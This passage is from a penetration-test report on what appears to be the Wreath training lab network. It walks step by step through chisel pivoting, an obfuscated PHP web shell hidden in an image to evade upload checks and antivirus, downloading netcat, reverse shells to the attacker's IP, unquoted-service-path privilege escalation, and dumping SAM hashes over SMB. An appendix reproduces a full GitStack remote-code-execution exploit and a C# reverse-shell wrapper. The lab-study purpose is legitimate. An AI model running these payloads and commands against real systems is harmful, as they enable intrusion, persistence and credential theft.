$ chisel client 10.200.84.150:41000 9020:10.200.84.100:80
```

This command starts the command and says to forward all the traffic from our **localhost:9020** to the Target Machine **10.200.84.100:80** using the **10.200.84.150:41000** in the middle.
```
PS C:\windows\temp> .\chisel.exe server -p 41000
```

Now, The page 10.200.84.100 is accessible on my localhost:9020

<img src="./screenshots/0035.jpg" alt="thomaswreath.thm" style="width:800px;"/>

To identify the server-side Programming language is used on webp page I create a whole proxy instead of just forwarding only one port 80:
```
evil-winrm -u Administrator -H '37db6301 -[SNIP]-- 8461e05c6bbd1' -i 10.200.84.150 Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint 

PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="lizard" dir=in action=allow protocol=tcp localport=44444 
Ok.

PS C:\Users\Administrator\Documents> upload /home/lizard/Downloads/chisel.exe C:\Windows\temp\chisel.exe 

PS C:\Users\Administrator\Documents> cd C:\Windows\temp 

PS C:\Windows\temp> .\chisel.exe server -p 44444 --socks5 chisel.exe 
: 2024/01/15 20:30:54 server: Fingerprint g3KRujLmRanbns035XvHg8ZqoHE+NpXEP53eDxCKmNI= + CategoryInfo : NotSpecified: (2024/01/15 20:3...pXEP53eDxCKmNI=:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError 2024/01/15 20:30:54 server: Listening on http://0.0.0.0:444442024/01/15 20:31:22 server: session#1: Client version (1.9.1-0kali1) differs from server version (1.9.1)
```

Next, I launch the chisel server on attacker machine:
```
$ chisel client 10.200.84.150:44444 44444:socks 
2024/01/16 08:16:30 client: Connecting to ws://10.200.84.150:44444 
2024/01/16 08:16:30 client: tun: proxy#127.0.0.1:44444=>socks: Listening 
2024/01/16 08:16:31 client: Connected (Latency 101.231576ms)
```

And configure Foxy Proxy in the browser:
```
Type: SOCKS5
Hostname: 127.0.01
Port: 4444
```

<img src="./screenshots/0005.jpg" alt="thomaswreath.thm" style="width:800px;"/>

After proxy connection is established, the page is accessible through browser on 10.200.84.100.
I used Wappalyzer extension in Fire Fox to see what Programming Language is used on web page:

<img src="./screenshots/0007.jpg" alt="thomaswreath.thm" style="width:800px;"/>

### Exploitation

I used Nmap to enumerate the host:
```
$ nmap localhost -p 9020 -T4 -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 05:33 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000089s latency).
Other addresses for localhost (not scanned): ::1

PORT 	STATE SERVICE VERSION
9020/tcp open  http	Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
| http-git:
|   127.0.0.1:9020/.git/
| 	Git repository found!
| 	Repository description: Unnamed repository; edit this file 'description' to name the...
| 	Last commit message: Initial Commit for the back-end # Please enter the commit me...
| 	Remotes:
|_  	http://192.168.1.172/Website.git
|_http-title: Thomas Wreath | Developer
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
| http-methods:
|_  Potentially risky methods: TRACE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.39 seconds
```

It immediately find the .git repo, and I used a tool called git-dumper to dump the repo and save it in a directory named thomasPC
```
$ git-dumper http://127.0.0.1:9020 thomasPC                                                     	 
[-] Testing http://127.0.0.1:9020/.git/HEAD [200]
[-] Testing http://127.0.0.1:9020/.git/ [200]
[-] Fetching .git recursively
—-[SNIP]--
```

### Analyzing the source code

I navigated to copied .git repository
cd thomasPC                              	 
```                                                                                                       	 
┌──(lizard㉿lizard)-[~/Downloads]
└─$ cd thomasPC

┌──(lizard㉿lizard)-[~/Downloads/thomasPC]
└─$ ls
css  favicon.png  fonts  img  index.html  js  resources
                                                                                                      
┌──(lizard㉿lizard)-[~/Downloads/thomasPC]
└─$ cd resources
                                                                                                     
┌──(lizard㉿lizard)-[~/Downloads/thomasPC/resources]
└─$ ls
assets  index.php                                                                                                      	 
┌──(lizard㉿lizard)-[~/Downloads/thomasPC/resources]
└─$ cat index.php
<?php

    if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
   	 $target = "uploads/".basename($_FILES["file"]["name"]);
   	 $goodExts = ["jpg", "jpeg", "png", "gif"];
   	 if(file_exists($target)){
   		 header("location: ./?msg=Exists");
   		 die();
   	 }
   	 $size = getimagesize($_FILES["file"]["tmp_name"]);
   	 if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
   		 header("location: ./?msg=Fail");
   		 die();
   	 }
   	 move_uploaded_file($_FILES["file"]["tmp_name"], $target);    
   	 header("location: ./?msg=Success");
   	 die();
    } else if ($_SERVER["REQUEST_METHOD"] == "post"){
   	 header("location: ./?msg=Method");
    }
```
<img src="./screenshots/0036.jpg" alt="thomaswreath.thm" style="width:800px;"/>

In the copied git folder I find 2 source codes. Firstly index.html which is the plain static website I have been seeing all these time. Another one is in resources/index.php in the .git directory.
Looking at that code I note that there’s an image upload option and it uses basic authentication which means when I try to visit the website it will pop up for a username password box. It’s interesting because there might be a shell upload vulnerability in the image upload function and I already have the credentials for Thomas from dumped hashes in mimikatz:

 **Thomas:i<3ruby**

<img src="./screenshots/0009.jpg" alt="thomaswreath.thm" style="width:800px;"/>

<img src="./screenshots/0010.jpg" alt="thomaswreath.thm" style="width:800px;"/>

As php is enabled in the website, I tried to upload a php webshell or reverse shell and catch that.
Now checking the source code, I see there’s been some validation going on so that no malicious file gets uploaded. What happens is :
A post request is made after the upload button is clicked.
There’s a list of mentioned extensions (jpg, jpeg, png, gif), so that no other extension like .php can be uploaded.
file_exists() function checks if the file has already been uploaded and if it’s already there the connection dies.
If the file has not been uploaded, it proceeds. There are 2 checks made, firstly the size or dimensions of the file is checked to see if it’s a valid image and then the extension is checked to see if it has one of the good extensions mentioned earlier.
If it makes all the checks, the file is moved to the uploads/ directory with the move_uploaded_file() function.
If the process ends, a success message is shown otherwise a fail message.
The original payload contained a simple web shell which could be used to run arbitrary commands on the system provided in the wreath parameter of the request.

```
<?php
$cmd = $_GET["wreath"];
if(isset($cmd)){
echo "<pre>" . shell_exec($cmd) . "</pre>";
}
die();
?>
```

I used php obfuscator https://www.gaijin.at/en/tools/php-obfuscator to bypass the antivirus software

<img src="./screenshots/0012.jpg" alt="thomaswreath.thm" style="width:800px;"/>

<img src="./screenshots/0013.jpg" alt="thomaswreath.thm" style="width:800px;"/>

As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables with “\”. 

I Created copy of image, renamed it to .jpeg.php and add payload from obfuscator
```
$ cp 1.jpeg 2v.jpeg.php
$ exiftool -Comment="<?php \$s0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$s0)){echo base64_decode('PHByZT4=').shell_exec(\$s0).base64_decode('PC9wcmU+');}die();?>" 2v.jpeg.php 1 image files updated
```

I upload the payload to http://localhost:9020/resources, and went to http://localhost:9020/resources/uploads/2v.jpeg.php

The command I provided has successfully run

I downloaded nc.exe on attacker machine from GitHub repository: `git clone https://github.com/int0x33/nc.exe/`, opened the listener with following command on my attacker machine  `python3 -m http.server 80` and uploaded it on target host with command:
``` 
C:\Users\Administrator\Documents> upload /home/lizard/Downloads/nc64.exe C: \Windows\temp\nc64.exe
```

I delivered netcat to target host 
```
curl http://10.50.102.41/nc64.exe -o c:\\windows\\temp\\lizardnc.exe
```

And adding the following curl at the url (10.50.102.41 is attacker machine ip):

localhost:9020/resources/uploads/2v.jpeg.php?wreath=curl http://10.50.102.41/nc64.exe -o c:\\windows\\temp\\lizardnc.exe
<img src="./screenshots/0016.jpg" alt="thomaswreath.thm" style="width:800px;"/>

The listener revealed:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (<http://0.0.0.0:80/>) ...
10.200.101.100 - - [21/Jan/2024 06:24:36] "GET /nc64.exe HTTP/1.1" 200 -
```

The next step is delivering the reverse shell to the target host. I opened netcat listener nc -lnvp 20000 on the attacker machine and put the shell in url:

localhost:9020/resources/uploads/2v.jpeg.php?wreath=powershell.exe c:\\windows\\temp\\lizardnc.exe 10.50.102.41 20000 -e cmd.exe

<img src="./screenshots/0017.jpg" alt="thomaswreath.thm" style="width:800px;"/>

The listener shows success
```
nc -lnvp 20000 
listening on [any] 20000 ... 
connect to [10.50.102.41] from (UNKNOWN) [10.200.101.100] 50104 Microsoft Windows [Version 10.0.17763.1637] (c) 2018 Microsoft Corporation. All rights reserved. 
C:\xampp\htdocs\resources\uploads>
```

### Enumeration the host 10.200.84.100

whoami/priv

<img src="./screenshots/0018.jpg" alt="thomaswreath.thm" style="width:800px;"/>

I Saw that one of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits  - SeImpersonatePrivilege.
Whoami/groups

<img src="./screenshots/0019.jpg" alt="thomaswreath.thm" style="width:800px;"/>

Unfortunately this account isn't in the Local Administrators group.
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

<img src="./screenshots/0020.jpg" alt="thomaswreath.thm" style="width:800px;"/>

This lists all of the services on the system, then filters so that only services that are not in the C:\\Windows directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.
There should be a bunch of results returned here. Read through them, paying particular attention to the PathName  column. Notice that one of the paths does not have quotation marks around it.
The lack of quotation marks around this service path indicates that it might be vulnerable to an Unquoted Service Path attack. In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the NT AUTHORITY\\SYSTEM account, we might be able to elevate privileges.
Check to see which account the service runs under sc qc SystemExplorerHelpService: 

<img src="./screenshots/0021.jpg" alt="thomaswreath.thm" style="width:800px;"/>

I saw the account is Local System account
I checked the permissions on the directory:
powershell "get-acl -Path 'C:\\Program Files (x86)\\System Explorer' | format-list"

<img src="./screenshots/0022.jpg" alt="thomaswreath.thm" style="width:800px;"/>

The account has full access: 
```
Access: BUILTIN\Users Allow FullControl
```

### Unquoted Service Path vulnerability
#### Privilege Escalation
I created netcat wrapper in C#, previously downloaded `mono-devel` on my attacker machine:
```
$ sudo apt install mono-devel 
'Create file with following code:'  
$ nano Wrapper.cs 
using System; 
using System.Diagnostics; 
  namespace Wrapper { 
    class Program { 
      static void Main(){ 
        Process proc = new Process(); 
        ProcessStartInfo procInfo = new          
        ProcessStartInfo("c:\\windows\\temp\\lizardnc.exe", "10.50.102.41 20001 -e cmd.exe"); 
        procInfo.CreateNoWindow = true; proc.StartInfo = procInfo; proc.Start(); 
      }  
    }   
  } 
$ ls Wrapper.cs 
'Compile file to .exe format'
$ mcs Wrapper.cs 
$ ls 
Wrapper.cs Wrapper.exe
```

I Downloaded the impacket to my attacker machine:

`sudo git clone <https://github.com/SecureAuthCorp/impacket> /opt/impacket && cd /opt/impacket && sudo pip3 install .`

Start SMB server from attack machine:

```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

In target machine (10.200.84.100) I authenticate new user:

```
$ nc -lnvp 20000 
listening on [any] 20000 ...
connect to [10.50.102.41] from (UNKNOWN) [10.200.101.100] 50158

C:\\xampp\\htdocs\\resources\\uploads> net use \\\\10.50.102.41\\share /USER:user s3cureP@ssword
```

### Transferring Wrapper.exe to 10.200.84.100 

I copied my compiled  Wrapper.exe program up to the target. Due to file permissions on the normal C:\\Windows\\Temp directory, we are doing this from our current user's own `%TEMP%` directory (10.50.102.41 is my attacker machine IP):

```
C:\\xampp\\htdocs\\resources\\uploads> copy \\\\10.50.102.41\\share\\Wrapper.exe %TEMP%\\wrapper-lizard.exe
```

I deleted the share:

```
C:\\xampp\\htdocs\\resources\\uploads> net use \\\\10.50.102.41\\share /del
```

Exploitation of the Unquoted Service Path

The steps of the exploitation are the following.
1. Start a listener.
2. Download Wrapper.exe to C:\Program Files (x86)\System Explorer\System.exe
3. Restart the SystemExplorerHelpService service to trigger the nc wrapper

I executed wrapper file:

```
C:\\xampp\\htdocs\\resources\\uploads> "%TEMP%\\wrapper-lizard.exe"
```

Now copied the wrapper file from C:\\Windows\\Temp\\wrapper-USERNAME.exe to C:\\Program Files (x86)\\System Explorer\\System.exe:

```
C:\\xampp\\htdocs\\resources\\uploads> copy %TEMP%\\wrapper-lizard.exe "C:\\Program Files (x86)\\System Explorer\\System.exe"
```

I Opened Listener (port is written in wrapper file) and set the listener on attacker machine:

```
$ nc -lnvp 20001                    
listening on [any] 20001 ...
```

Stop and Start the exploitable path service SystemExplorerHelpService on target host:

```
C:\\xampp\\htdocs\\resources\\uploads> sc stop SystemExplorerHelpService
C:\\xampp\\htdocs\\resources\\uploads> sc start SystemExplorerHelpService
```

I successfully got root on target host:

```
$ nc -lnvp 20001                    
listening on [any] 20001 ...
connect to [10.50.102.41] from (UNKNOWN) [10.200.101.100] 49754
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\\Windows\\system32>
```

Data Exfiltration
Transfering dumps to attacker machine
To dump the hashes, I need to dump 2 Hives.
The SAM Hive which contains all the user hashes that were cached while logging in.
The System Hive which contains system information and the boot key.
I started smb server from attacker machine:

```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```

I connect to target host with command net use, started SystemExplorerHelpService and save the hives directly to my attacker machine throw smb connection.

```
$ nc -lnvp 20001 listening on [any] 20001 ...
connect to [10.50.102.41] from (UNKNOWN) [10.200.101.100] 4
9754 Microsoft Windows [Version 10.0.17763.1637] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32> del "C:\Program Files (x86)\System Explorer\System.exe" C:\Windows\system32> net use \\10.50.102.41\share /USER:user s3cureP@ssword
C:\Windows\system32> sc start SystemExplorerHelpService C:\Windows\system32>reg.exe save HKLM\SAM \\10.50.102.41\share\sam.bak C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.102.41\share\system.bak C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.102.41\share\system.bak C:\Windows\system32>net use \\10.50.102.41\share /del
```

To dump the hashes I used impacket’s secretsdump.py file located on my attacker machine

```
$ python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCALImpacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2023 Fortra [*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807cee---[SNIP]---284cd2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2::: Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b0--[SNIP]---31101f::: [*] Cleaning up...
```

### Cleanup
From 10.200.84.100 I removed my netcat wrapper System.exe, and the custom compiled nc.exe binary which was used to bypass the Antivirus software running on the system. I also removed my uploaded file upload exploit file 2v.jpeg.php which was used to get the initial remote code execution. 
From 10.200.84.150 I removed the file that the exploit created exploit.php, the created user account with net user /DELETE, and chisel.exe that I used for pivoting inside the internal network.
From 10.200.84.200 I removed the uploaded nmap_service binary which was used to enumerate the internal network.
Conclusion
The Wreath network suffered a series of control failures which led to a complete compromise of critical company assets. These failures would have a dramatic effect on the Wreath network if a malicious party had exploited them.
The specific goals of the penetration test were started as:
Identifying if a remote attacker could penetrate Thomas Wreath’s home network’s defenses
Determining the impact of a security breach on:
 Confidentiality of the company’s private data
Internal infrastructure and availability of Thomas Wreath’s home network

### References
CVE‑2019‑15107: medium.com/@foxsin34/webmin‑1‑890‑exploit‑unauthorized‑rce‑cve‑2019‑15107‑23e4d5a9c3b4 
https://cve.circl.lu/cve/CVE‑2019‑15107 
https://github.com/foxsin34/WebMin‑1.890‑Exploit‑unauthorized‑RCE 
CVE‑2018‑5955: https://security.szurek.pl/en/gitstack‑2310‑unauthenticated‑rce/
https://cve.circl.lu/cve/CVE‑2018‑5955 
https://www.exploit‑db.com/exploits/43777
Wreath Network Penetration Test Report                                                                              2023‑01‑22

### Appendices
#### 43777.py
```
#!/usr/bin/python2
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#   
#1. Description
#  
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '10.200.101.150'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print ("[+] Get user list")
try:
    r = requests.get("http://{}/rest/user/".format(ip))
    user_list = r.json()
    user_list.remove('everyone')
except:
    pass

if len(user_list) > 0:
    username = user_list[0]
    print ("[+] Found user {}".format(username))
else:
    r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
    print ("[+] Create user")
    
    if not "User created" in r.text and not "User already exist" in r.text:
   	 print ("[-] Cannot create user")
   	 os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
    print ("[+] Web repository already enabled")
else:
    print ("[+] Enable web repository")
    r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
    if not "Web interface successfully enabled" in r.text:
   	 print ("[-] Cannot enable web interface")
   	 os._exit(0)

print ("[+] Get repositories list")
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
    repository = repository_list[0]['name']
    print ("[+] Found repository {}".format(repository))
else:
    print ("[+] Create repository")

    r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
    if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
   	 print ("[-] Cannot create repository")
   	 os._exit(0)

print ("[+] Add user to repository")
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
    print ("[-] Cannot add user to repository")
    os._exit(0)    

print ("[+] Disable access for anyone")
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
    print ("[-] Cannot remove access for anyone")
    os._exit(0)    

print ("[+] Create backdoor in PHP")
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print (r.text.encode(sys.stdout.encoding, errors='replace'))

print ("[+] Execute command")
r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
print (r.text.encode(sys.stdout.encoding, errors='replace'))
```
    
### Wrapper.cs
```
using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
    	static void Main(){
        	Process proc = new Process();
        	ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\lizardnc.exe", "10.50.102.41 20001 -e cmd.exe");
        	procInfo.CreateNoWindow = true;
        	proc.StartInfo = procInfo;
        	proc.Start();
    	}
	}
}
```

